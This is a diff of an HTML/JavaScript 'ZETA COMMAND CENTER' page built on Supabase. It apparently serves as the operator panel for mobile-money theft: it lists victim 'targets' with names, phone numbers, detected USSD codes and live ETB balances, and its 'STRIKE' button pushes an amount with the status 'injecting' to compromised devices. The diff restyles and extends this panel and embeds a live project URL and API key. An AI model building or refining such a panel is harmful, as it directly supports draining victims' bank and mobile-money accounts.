@@ -3,53 +3,149 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zeta Control Panel</title>
+<title>ZETA CONTROL PANEL v2</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-  :root { --neon-green: #00ff41; --bg-dark: #0a0a0a; --card-bg: #161616; }
-  body { font-family: 'Courier New', Courier, monospace; background: var(--bg-dark); color: #e0e0e0; margin: 0; padding: 10px; }
+  :root { 
+    --neon-green: #00ff41; 
+    --bg-dark: #0a0a0a; 
+    --card-bg: #161616; 
+    --warning-orange: #ffcc00;
+  }
+  
+  body { 
+    font-family: 'Courier New', Courier, monospace; 
+    background: var(--bg-dark); 
+    color: #e0e0e0; 
+    margin: 0; 
+    padding: 10px; 
+  }
+
   .container { max-width: 1200px; margin: 0 auto; }
-  h1 { color: var(--neon-green); text-transform: uppercase; letter-spacing: 2px; border-bottom: 2px solid var(--neon-green); padding-bottom: 10px; font-size: 1.5rem; }
   
-  /* Responsive Table Replacement for Mobile */
-  .target-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px; }
-  .target-card { background: var(--card-bg); border: 1px solid #333; padding: 15px; border-radius: 8px; position: relative; }
-  .target-card.active { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
+  h1 { 
+    color: var(--neon-green); 
+    text-transform: uppercase; 
+    letter-spacing: 2px; 
+    border-bottom: 2px solid var(--neon-green); 
+    padding-bottom: 10px; 
+    font-size: 1.5rem; 
+    margin-bottom: 20px;
+  }
   
-  /* Desktop View */
-  @media (min-width: 768px) {
-    .target-grid { grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); }
+  /* Grid Layout */
+  .target-grid { 
+    display: grid; 
+    grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
+    gap: 20px; 
+  }
+
+  /* Target Card Styling */
+  .target-card { 
+    background: var(--card-bg); 
+    border: 1px solid #333; 
+    padding: 20px; 
+    border-radius: 8px; 
+    transition: all 0.3s ease;
+  }
+
+  .target-card.active { 
+    border-color: var(--neon-green); 
+    box-shadow: 0 0 15px rgba(0, 255, 65, 0.15); 
+  }
+
+  /* Data Display Section */
+  .data-box {
+    background: #000;
+    padding: 15px;
+    border-radius: 4px;
+    border-left: 4px solid var(--neon-green);
+    margin: 15px 0;
   }
 
   .field { margin-bottom: 8px; font-size: 0.9rem; }
-  .label { color: #888; text-transform: uppercase; font-size: 0.7rem; }
-  .value { color: #fff; }
-  .balance { color: #ffcc00; font-weight: bold; font-size: 1.1rem; }
+  .label { color: #888; text-transform: uppercase; font-size: 0.75rem; display: block; }
+  .value { color: #fff; font-size: 1rem; }
+  .balance { color: var(--warning-orange); font-weight: bold; font-size: 1.2rem; }
   
-  .status-pill { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; background: #333; }
-  .status-injecting { background: #aa0000; color: white; animation: blink 1s infinite; }
-  
-  @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+  /* Status Indicators */
+  .status-pill { 
+    display: inline-block; 
+    padding: 3px 10px; 
+    border-radius: 4px; 
+    font-size: 0.7rem; 
+    background: #2a2a2a; 
+    text-transform: uppercase;
+    font-weight: bold;
+  }
 
-  input[type="number"] { background: #222; color: var(--neon-green); border: 1px solid #444; padding: 10px; border-radius: 4px; width: 60%; font-size: 1rem; }
-  .btn-send { background: var(--neon-green); color: black; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; font-weight: bold; width: 35%; float: right; }
+  .status-injecting { 
+    background: #aa0000; 
+    color: white; 
+    animation: blink 1s infinite; 
+  }
   
-  #status-bar { font-size: 0.8rem; color: var(--neon-green); margin-bottom: 10px; background: #1a1a1a; padding: 5px 10px; border-radius: 4px; }
+  @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+
+  /* Input & Button Controls */
+  .control-group {
+    display: flex;
+    gap: 10px;
+    margin-top: 15px;
+  }
+
+  input[type="number"] { 
+    background: #222; 
+    color: var(--neon-green); 
+    border: 1px solid #444; 
+    padding: 12px; 
+    border-radius: 4px; 
+    flex-grow: 1;
+    font-size: 1.1rem; 
+    outline: none;
+  }
+
+  .btn-send { 
+    background: var(--neon-green); 
+    color: black; 
+    border: none; 
+    padding: 12px 20px; 
+    cursor: pointer; 
+    border-radius: 4px; 
+    font-weight: bold; 
+    text-transform: uppercase;
+    transition: transform 0.1s;
+  }
+
+  .btn-send:active { transform: scale(0.95); }
+  
+  #status-bar { 
+    font-size: 0.8rem; 
+    color: var(--neon-green); 
+    margin-bottom: 15px; 
+    background: #1a1a1a; 
+    padding: 8px 15px; 
+    border-radius: 4px; 
+    border: 1px solid #333;
+  }
 </style>
 </head>
 <body>
 
 <div class="container">
   <h1>ZETA COMMAND CENTER</h1>
-  <div id="status-bar">SYSTEM INITIALIZING...</div>
+  <div id="status-bar">CONNECTING TO NODES...</div>
+  
   <div id="targetList" class="target-grid">
     </div>
 </div>
 
 <script>
+  // YOUR CONFIGURATION
   const SUPABASE_URL = 'https://apdsaisgviycynayhppl.supabase.co';
   const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMU';
- const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+  
+  const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
   function renderCard(target) {
     const container = document.getElementById('targetList');
@@ -61,21 +157,40 @@
     const cardHtml = `
       <div class="target-card ${isInjecting ? 'active' : ''}" id="card-${target.id}">
         <div class="field">
-          <span class="label">Target:</span> <span class="value"><strong>${target.full_name || 'UNKNOWN'}</strong> (${target.phone_number || 'N/A'})</span>
+          <span class="label">Target Device</span>
+          <span class="value"><strong>${target.full_name || 'UNKNOWN'}</strong></span>
+          <span style="color:#666; font-size:0.8rem;">[${target.id.substring(0,8)}]</span>
         </div>
+
+        <div class="data-box">
+            <div class="field">
+              <span class="label">Detected USSD Code</span>
+              <span class="value" style="color:var(--neon-green); font-weight:bold;">
+                ${target.active_ussd || '---'}
+              </span>
+            </div>
+            <div class="field" style="margin-bottom:0;">
+              <span class="label">Live Balance</span>
+              <span class="balance">${target.current_balance || '0.00'} ETB</span>
+            </div>
+        </div>
+
         <div class="field">
-          <span class="label">Balance:</span> <span class="balance">${target.current_balance} ETB</span>
+          <span class="status-pill ${isInjecting ? 'status-injecting' : ''}">
+            ${target.ussd_status || 'IDLE'}
+          </span>
+          <span style="margin-left:10px; color:#555; font-size:0.8rem;">
+            Seen: ${lastSeenDate}
+          </span>
         </div>
-        <div class="field">
-          <span class="label">Active USSD:</span> <span class="value" style="color:var(--neon-green)">${target.active_ussd || 'None'}</span>
-        </div>
-        <div class="field">
-          <span class="status-pill ${isInjecting ? 'status-injecting' : ''}">${target.ussd_status || 'IDLE'}</span>
-          <span class="label" style="margin-left:10px">Last Seen:</span> <span class="value">${lastSeenDate}</span>
-        </div>
+
         <hr style="border:0; border-top:1px solid #333; margin:15px 0;">
-        <div style="overflow:auto">
-          <input type="number" id="amt-${target.id}" value="${target.target_amount}" placeholder="Amount">
+        
+        <div class="label" style="margin-bottom:5px;">Command Entry</div>
+        <div class="control-group">
+          <input type="number" id="amt-${target.id}" 
+                 value="${target.target_amount || ''}" 
+                 placeholder="0.00">
           <button class="btn-send" onclick="updateAmount('${target.id}')">STRIKE</button>
         </div>
       </div>
@@ -89,7 +204,11 @@
   }
 
   async function fetchTargets() {
-    const { data, error } = await supabaseClient.from('targets').select('*').order('last_seen', { ascending: false });
+    const { data, error } = await supabaseClient
+        .from('targets')
+        .select('*')
+        .order('last_seen', { ascending: false });
+        
     if (error) {
       document.getElementById('status-bar').innerText = 'ERROR: ' + error.message;
     } else {
@@ -100,19 +219,33 @@
   }
 
   async function updateAmount(id) {
-    const amount = document.getElementById(`amt-${id}`).value;
+    const amountField = document.getElementById(`amt-${id}`);
+    const amount = amountField.value;
+    
+    if(!amount || amount <= 0) {
+        alert("Please enter a valid amount.");
+        return;
+    }
+
     const { error } = await supabaseClient
       .from('targets')
-      .update({ target_amount: amount, ussd_status: 'injecting' })
+      .update({ 
+        target_amount: amount, 
+        ussd_status: 'injecting' 
+      })
       .eq('id', id);
 
-    if (error) alert("Strike Failed: " + error.message);
-    else console.log(`Command Pushed: ${amount} ETB`);
+    if (error) {
+        alert("Strike Failed: " + error.message);
+    } else {
+        console.log(`Strike Sent: ${amount} ETB to node ${id}`);
+    }
   }
 
+  // Initial Load
   fetchTargets();
 
-  // Real-time listener
+  // Real-time Subscriptions
   supabaseClient.channel('zeta-sync')
     .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, payload => {
       if (payload.new) renderCard(payload.new);
